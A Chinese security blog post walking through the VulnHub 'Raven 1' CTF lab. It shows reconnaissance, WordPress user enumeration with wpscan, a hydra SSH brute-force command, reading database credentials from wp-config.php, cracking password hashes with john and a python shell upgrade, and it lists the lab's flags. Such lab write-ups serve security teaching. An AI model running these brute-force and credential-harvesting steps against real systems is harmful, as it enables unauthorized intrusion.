> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/34heaoiBy2ObBvpwuuIv_g)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **20** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/0eStkRlFeLpRNN1wgDtolVObh8qGRlETQMIDXGNKvKYjEKuuWO4hzPiafrslXhVGBwcTMG3Jg1s024bHuwVI6yA/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/raven-1,256/

靶机难度：中等（CTF）

靶机发布日期：2018 年 8 月 14 日

靶机描述：Raven 是初学者 / 中级 boot2root 计算机。有四个标记可以找到，并且有两个预期的扎根方法。使用 VMware 构建并在 Virtual Box 上进行了测试。

目标：找到 ** 四个 **flag.txt 信息

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhZuwziczry5e3YgCKm1BxnujkxxXh2dmcKT01EiaYRacR4ic42kIBoHy7A/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhu0Nicj8Y1foOoMjOcXibxzmlNpMF8O91HGzCEoYOzwgZmGLkBy1icMZRA/640?wx_fmt=png)主机 IP：

```
192.168.182.129
```

发现了 22、80、111 和 36898 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhXEJNTPRRVr5NCDYUxPhTVhsH66Z1oByKTSzNjxZABGcOIUZ8Yhel1Q/640?wx_fmt=png)

信息量很多，直接用 dirb 对他目录扫描，哪晓得也要扫半天，回到 web 继续查看...

在 service 模块源代码中发现了 flag1...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhhBddZMbLdeUHgfJyQeiccKnk6ub5RWUOetibErUxIvbhS97Z4vwmj2ZQ/640?wx_fmt=png)

```
flag1：b9bbcb33e11b80be759c4e844862482d
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYh3raYKXaPibsrCWwBEt0suMiaFZ622WITVpRgUbH30kDToI00L53MkYKg/640?wx_fmt=png)

点击 BLOG 模块进不去，但是发现这是 wordpress... 好吧，直接 wepcan 扫它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhRrrkns3BlXWBiafOeZT8TZu2t4r9z14WpXWco3X8TqYKY3E5k8nHEhg/640?wx_fmt=png)

```
wpscan -u http://192.168.182.129/wordpress -eu
```

发现两个用户：

```
steven
michael
```

直接上九头蛇使用自身密码库进行暴力破解！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhkk3IS2D4klDxWufPCwtVIpHxfBmmPibq3VMjlzxcPtt4HvlfEj084LQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYh4cEvbGB7XqaQArfbKUuMnibdZvy3I5VjneBAjQucm4K0OQtxrgFLp2w/640?wx_fmt=png)

```
命令：hydra -L 用户 -P /usr/share/wordlists/rockyou.txt ssh://192.168.182.129
login: michael   password: michael
```

二、提权

这边进行 ssh 登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhB4TuXZM4jStYibRib2yOtlllzqqiboricxwwE1PBxDKQOz1DswN9yuYvPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhjrJfuQBia2DOibrKSqbeqgMGN6Ol7S81CED4s5D6bia52EqsEldm0J1gA/640?wx_fmt=png)

在 www 目录下发现

```
flag2：fc3fd58dcdad9ab23faca6e9a36e581c
```

这边我们登录进来后，需要获得 root 权限，查看内核版本和操作系统看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhqjgxhHiaDtuQHJf9vsKqiaQOiclPQ0ic9CV5Xq1s3l6uibZh6LtFRLt5uiaQ/640?wx_fmt=png)

看到操作系统和内核版本很高.. 无法运行内核级漏洞利用程序来获取 root 用户访问权限！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhmW2HvCibf1aOic4S36qMPqbTQV5zJepgBg0OmbWtUnDedicA86ZldoC6g/640?wx_fmt=png)

这边想偷巧直接用 python 取得 root 权限，说 michael 用户不在 sudoers 提权用户中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhelTkNKFQGCN9icUibKV5CxJPsbSazicWHiaOnN1oPniczTL8YurVaK4LDsw/640?wx_fmt=png)

在 wordpress 目录下发现了 wp-config.php，在 Raven：2 中也讲过了这是配置 MySQL 数据库的参数文件... 查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhGEJEiaASoVvEK5H4AapHSGGADtdu3VladGGia05kEQ81gUjnnd1qfHicA/640?wx_fmt=png)

发现 root 密码：

```
R@v3nSecurity
```

登录数据库.......

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhEVshKRpx4ZAktkUESiaqVqtj58TGZAynNGOgyASc8baNopyuuzl7yfg/640?wx_fmt=png)

一路查看，进入到 table 目录下经过 Raven：2 的经验，这边直接可以查看 flag3/4

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhJbkth4pxFqQrCr18PuNQiaCCtORZcfzTEuHBquEn5kPJHiaNkMLSWTGA/640?wx_fmt=png)

```
flag3{afc01ab56b50591e7dccf93122770cd2} 
flag4{715dea6c055b9fe3337544932f2941ce}
```

（一般是在 root 权限查看...）  

但是没获得 root 权限... 继续查看 wp_users 中查看到的内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYhfTFmgQ5eGxIol4yRicb2L8aO4auLt4HbeUvYBuDgsdU8TN1wmkA9ribQ/640?wx_fmt=png)

翻译两个哈希值

```
$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
```

这边用 john 可以破解这哈希值，michael 和 pink84...

这边直接登陆 steven 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYh65PH9GLNFdYTAh2eUhdWCvgRlEbMVibibGYqG8TQY30qJz31ibvwIdYCA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTjx7c92Bqvyiags1xWqZYh3ztTlpXBuQ0xJIXibxALWrGOW4iaKBJicbNPicvKtXLzmuoSA7aY1kv5Fg/640?wx_fmt=png)

```
命令：python -c 'import pty; pty.spawn("/bin/bash");'
CONGRATULATIONS on successfully rooting Raven!
```

![](https://mmbiz.qpic.cn/mmbiz_png/0eStkRlFeLpRNN1wgDtolVObh8qGRlETQMIDXGNKvKYjEKuuWO4hzPiafrslXhVGBwcTMG3Jg1s024bHuwVI6yA/640?wx_fmt=png)

因提前拿下了 Ranven：2，导致对 Ranven：1 就过得比较快，中间有些直接细节直接带过，不懂得回去看看 Ranven：2 文章....

由于我们已经成功得到 root 权限 & 找到四个 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)